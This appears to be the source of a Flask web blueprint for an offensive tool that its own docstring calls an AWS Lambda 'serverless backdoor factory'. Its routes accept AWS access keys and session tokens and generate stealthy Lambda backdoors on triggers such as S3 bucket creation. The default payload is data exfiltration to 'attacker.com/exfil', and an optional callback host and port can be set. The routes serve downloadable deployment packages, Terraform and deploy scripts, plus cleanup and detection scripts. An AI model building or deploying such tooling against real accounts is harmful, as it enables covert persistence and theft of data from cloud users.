"""
AWS Lambda Persistence Routes
=============================
Flask blueprint for AWS Lambda serverless backdoor factory.
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import io
import base64
import json
import sys
import os

# Add tools to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from aws_lambda_persistence import (
        get_lambda_engine,
        LambdaTriggerType,
        PayloadType,
        AWSCredentials
    )
except ImportError:
    get_lambda_engine = None

aws_lambda_bp = Blueprint('aws_lambda', __name__, url_prefix='/aws-lambda')


@aws_lambda_bp.route('/')
def index():
    """AWS Lambda Persistence main page"""
    return render_template('aws_lambda.html')


@aws_lambda_bp.route('/api/triggers', methods=['GET'])
def get_triggers():
    """Get available trigger types"""
    triggers = [
        {"value": t.value, "label": t.value.replace("_", " ").title()}
        for t in LambdaTriggerType
    ]
    return jsonify({"triggers": triggers})


@aws_lambda_bp.route('/api/payloads', methods=['GET'])
def get_payloads():
    """Get available payload types"""
    payloads = [
        {"value": p.value, "label": p.value.replace("_", " ").title()}
        for p in PayloadType
    ]
    return jsonify({"payloads": payloads})


@aws_lambda_bp.route('/api/create-backdoor', methods=['POST'])
def create_backdoor():
    """Create Lambda backdoor package"""
    if not get_lambda_engine:
        return jsonify({"error": "Lambda engine not available"}), 500
    
    try:
        data = request.get_json()
        
        trigger_type = LambdaTriggerType(data.get('trigger_type', 's3_bucket_create'))
        payload_type = PayloadType(data.get('payload_type', 'data_exfil'))
        exfil_endpoint = data.get('exfil_endpoint', 'https://attacker.com/exfil')
        callback_host = data.get('callback_host')
        callback_port = data.get('callback_port')
        stealth = data.get('stealth', True)
        
        # Set credentials if provided
        engine = get_lambda_engine()
        
        if data.get('access_key') and data.get('secret_key'):
            engine.set_credentials(
                access_key=data['access_key'],
                secret_key=data['secret_key'],
                session_token=data.get('session_token'),
                region=data.get('region', 'us-east-1')
            )
        
        # Create backdoor
        artifact = engine.create_backdoor(
            trigger_type=trigger_type,
            payload_type=payload_type,
            exfil_endpoint=exfil_endpoint,
            callback_host=callback_host,
            callback_port=int(callback_port) if callback_port else None,
            stealth=stealth
        )
        
        return jsonify({
            "success": True,
            "artifact_id": artifact['id'],
            "function_name": artifact['backdoor'].function_name,
            "trigger_type": artifact['backdoor'].trigger_type.value,
            "payload_type": artifact['backdoor'].payload_type.value,
            "description": artifact['backdoor'].description,
            "lambda_code_preview": artifact['lambda_code'][:500] + "...",
            "deployment_package_size": len(artifact['deployment_package_b64']),
            "terraform_config_size": len(artifact['terraform_config']),
            "cli_commands_count": len(artifact['cli_commands'])
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@aws_lambda_bp.route('/api/download/<artifact_type>/<artifact_id>', methods=['GET'])
def download_artifact(artifact_type, artifact_id):
    """Download generated artifact"""
    if not get_lambda_engine:
        return jsonify({"error": "Lambda engine not available"}), 500
    
    engine = get_lambda_engine()
    
    # Find artifact
    artifact = None
    for a in engine.generated_artifacts:
        if a['id'] == artifact_id:
            artifact = a
            break
    
    if not artifact:
        return jsonify({"error": "Artifact not found"}), 404
    
    if artifact_type == 'lambda_code':
        return send_file(
            io.BytesIO(artifact['lambda_code'].encode()),
            mimetype='text/x-python',
            as_attachment=True,
            download_name=f"lambda_function_{artifact_id}.py"
        )
    
    elif artifact_type == 'deployment_package':
        zip_data = base64.b64decode(artifact['deployment_package_b64'])
        return send_file(
            io.BytesIO(zip_data),
            mimetype='application/zip',
            as_attachment=True,
            download_name=f"lambda_package_{artifact_id}.zip"
        )
    
    elif artifact_type == 'terraform':
        return send_file(
            io.BytesIO(artifact['terraform_config'].encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"lambda_terraform_{artifact_id}.tf"
        )
    
    elif artifact_type == 'cli_commands':
        commands = '\n'.join(artifact['cli_commands'])
        return send_file(
            io.BytesIO(commands.encode()),
            mimetype='text/x-shellscript',
            as_attachment=True,
            download_name=f"lambda_deploy_{artifact_id}.sh"
        )
    
    return jsonify({"error": "Invalid artifact type"}), 400


@aws_lambda_bp.route('/api/cleanup-script/<artifact_id>', methods=['GET'])
def get_cleanup_script(artifact_id):
    """Get cleanup script for backdoor removal"""
    if not get_lambda_engine:
        return jsonify({"error": "Lambda engine not available"}), 500
    
    engine = get_lambda_engine()
    
    # Find artifact
    artifact = None
    for a in engine.generated_artifacts:
        if a['id'] == artifact_id:
            artifact = a
            break
    
    if not artifact:
        return jsonify({"error": "Artifact not found"}), 404
    
    script = engine.generate_cleanup_script(artifact['backdoor'].function_name)
    
    return send_file(
        io.BytesIO(script.encode()),
        mimetype='text/x-shellscript',
        as_attachment=True,
        download_name=f"cleanup_{artifact_id}.sh"
    )


@aws_lambda_bp.route('/api/detection-script', methods=['GET'])
def get_detection_script():
    """Get detection script"""
    if not get_lambda_engine:
        return jsonify({"error": "Lambda engine not available"}), 500
    
    engine = get_lambda_engine()
    script = engine.generate_detection_script()
    
    return send_file(
        io.BytesIO(script.encode()),
        mimetype='text/x-shellscript',
        as_attachment=True,
        download_name="detect_lambda_backdoors.sh"
    )


@aws_lambda_bp.route('/api/artifacts', methods=['GET'])
def list_artifacts():
    """List all generated artifacts"""
    if not get_lambda_engine:
        return jsonify({"error": "Lambda engine not available"}), 500
    
    engine = get_lambda_engine()
    
    artifacts = []
    for a in engine.generated_artifacts:
        artifacts.append({
            "id": a['id'],
            "function_name": a['backdoor'].function_name,
            "trigger_type": a['backdoor'].trigger_type.value,
            "payload_type": a['backdoor'].payload_type.value,
            "created_at": a['created_at']
        })
    
    return jsonify({"artifacts": artifacts})


@aws_lambda_bp.route('/api/summary', methods=['GET'])
def get_summary():
    """Get engine summary"""
    if not get_lambda_engine:
        return jsonify({"error": "Lambda engine not available"}), 500
    
    engine = get_lambda_engine()
    return jsonify(engine.get_summary())
